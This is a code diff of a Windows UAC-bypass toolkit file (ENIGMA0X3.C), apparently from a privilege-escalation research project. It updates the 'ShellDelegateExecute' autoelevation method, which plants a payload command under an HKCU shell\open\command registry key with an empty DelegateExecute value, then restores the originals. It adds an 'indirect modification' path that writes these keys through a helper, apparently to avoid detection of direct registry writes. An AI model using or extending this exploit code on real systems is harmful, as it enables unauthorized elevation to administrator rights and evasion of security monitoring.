@@ -4,9 +4,9 @@
 *
 *  TITLE:       ENIGMA0X3.C
 *
-*  VERSION:     3.17
+*  VERSION:     3.19
 *
-*  DATE:        18 Mar 2019
+*  DATE:        22 May 2019
 *
 *  Enigma0x3 autoelevation methods and everything based on the same
 *  ShellExecute related registry manipulations idea.
@@ -359,7 +359,7 @@ NTSTATUS ucmAppPathMethod(
         return STATUS_INVALID_PARAMETER_2;
 
     if (lpszTargetApp == NULL)
-        return STATUS_INVALID_PARAMETER_3;   
+        return STATUS_INVALID_PARAMETER_3;
 
     //
     // If under Wow64 disable redirection.
@@ -513,7 +513,8 @@ NTSTATUS ucmSdcltIsolatedCommandMethod(
         lResult = RegSetValueEx(
             hKey,
             lpTargetValue,
-            0, REG_SZ,
+            0,
+            REG_SZ,
             (BYTE*)lpszPayload,
             cbData);
 
@@ -707,6 +708,7 @@ NTSTATUS ucmShellDelegateExecuteCommandMethod(
     LPWSTR  lpTargetValue = TEXT("");
     HKEY    hKey = NULL;
 
+    WCHAR szKey[MAX_PATH + 1];
     WCHAR szBuffer[MAX_PATH * 2];
     WCHAR szOldValue[MAX_PATH + 1];
     WCHAR szOldDelegateExecute[MAX_PATH + 1];
@@ -719,6 +721,10 @@ NTSTATUS ucmShellDelegateExecuteCommandMethod(
     }
 #endif
 
+#ifdef _DEBUG
+    g_ctx->MethodExecuteType = ucmExTypeIndirectModification;
+#endif
+
     do {
         if ((cchTargetApp >= MAX_PATH) || (cchTargetApp == 0))
             return STATUS_INVALID_PARAMETER_2;
@@ -727,9 +733,9 @@ NTSTATUS ucmShellDelegateExecuteCommandMethod(
         if (cchPayload == 0)
             return STATUS_INVALID_PARAMETER_6;
 
-        _strcpy(szBuffer, lpTargetKey);
-        _strcat(szBuffer, T_SHELL_OPEN_COMMAND);
-        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szBuffer, 0, NULL,
+        _strcpy(szKey, lpTargetKey);
+        _strcat(szKey, T_SHELL_OPEN_COMMAND);
+        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szKey, 0, NULL,
             REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, &dwDisposition);
 
         if (lResult != ERROR_SUCCESS)
@@ -755,29 +761,68 @@ NTSTATUS ucmShellDelegateExecuteCommandMethod(
         if (lResult == ERROR_SUCCESS)
             bDelegateExecuteExist = TRUE;
 
-        //
-        // Set empty DelegateExecute value.
-        //
-        szBuffer[0] = 0;
-        cbData = 0;
-        lResult = RegSetValueEx(
-            hKey,
-            T_DELEGATEEXECUTE,
-            0, REG_SZ,
-            (BYTE*)szBuffer,
-            cbData);
+        lResult = ERROR_ACCESS_DENIED;
 
-        if (lResult != ERROR_SUCCESS)
+        switch (g_ctx->MethodExecuteType) {
+
+        case ucmExTypeIndirectModification:
+
+            //
+            // Set empty DelegateExecute value.
+            //
+            if (supIndirectRegAdd(REG_HKCU,
+                szKey,
+                T_DELEGATEEXECUTE,
+                T_REG_SZ,
+                TEXT("")))
+            {
+                //
+                // Set "Default" value.
+                //
+                if (supIndirectRegAdd(REG_HKCU,
+                    szKey,
+                    lpTargetValue,
+                    T_REG_SZ,
+                    lpPayload))
+                {
+                    lResult = ERROR_SUCCESS;
+                }
+            }
+
             break;
 
-        cbData = (DWORD)((1 + cchPayload) * sizeof(WCHAR));
+        case ucmExTypeDefault:
+        default:
 
-        lResult = RegSetValueEx(
-            hKey,
-            lpTargetValue,
-            0, REG_SZ,
-            (BYTE*)lpPayload,
-            cbData);
+            //
+            // Set empty DelegateExecute value.
+            //
+            cbData = 0;
+            szBuffer[0] = 0;
+            lResult = RegSetValueEx(
+                hKey,
+                T_DELEGATEEXECUTE,
+                0, REG_SZ,
+                (BYTE*)szBuffer,
+                cbData);
+
+            if (lResult == ERROR_SUCCESS) {
+
+                //
+                // Set "Default" value.
+                //
+                cbData = (DWORD)((1 + cchPayload) * sizeof(WCHAR));
+                lResult = RegSetValueEx(
+                    hKey,
+                    lpTargetValue,
+                    0, REG_SZ,
+                    (BYTE*)lpPayload,
+                    cbData);
+
+            }
+
+            break;
+        }
 
         if (lResult == ERROR_SUCCESS) {
 
@@ -802,8 +847,23 @@ NTSTATUS ucmShellDelegateExecuteCommandMethod(
                 //
                 // Value was before us, restore original.
                 //
-                RegSetValueEx(hKey, lpTargetValue, 0, REG_SZ,
-                    (BYTE*)szOldValue, cbOldData);
+                switch (g_ctx->MethodExecuteType) {
+
+                case ucmExTypeIndirectModification:
+                
+                    supIndirectRegAdd(REG_HKCU,
+                        szKey,
+                        lpTargetValue,
+                        T_REG_SZ,
+                        szOldValue);
+
+                    break;
+                
+                default:
+                    RegSetValueEx(hKey, lpTargetValue, 0, REG_SZ,
+                        (BYTE*)szOldValue, cbOldData);
+                    break;
+                }
             }
         }
 
@@ -811,9 +871,24 @@ NTSTATUS ucmShellDelegateExecuteCommandMethod(
         // If DelegateExecute was before restore it else remove.
         //
         if (bDelegateExecuteExist) {
-            RegSetValueEx(hKey, T_DELEGATEEXECUTE, 0, REG_SZ,
-                (BYTE*)szOldDelegateExecute, cbOldDelegateData);
+            switch (g_ctx->MethodExecuteType) {
 
+            case ucmExTypeIndirectModification:
+
+                supIndirectRegAdd(REG_HKCU,
+                    szKey,
+                    T_DELEGATEEXECUTE,
+                    T_REG_SZ,
+                    szOldDelegateExecute);
+
+                break;
+
+            case ucmExTypeDefault:
+            default:
+                RegSetValueEx(hKey, T_DELEGATEEXECUTE, 0, REG_SZ,
+                    (BYTE*)szOldDelegateExecute, cbOldDelegateData);
+                break;
+            }
         }
         else {
             RegDeleteValue(hKey, T_DELEGATEEXECUTE);
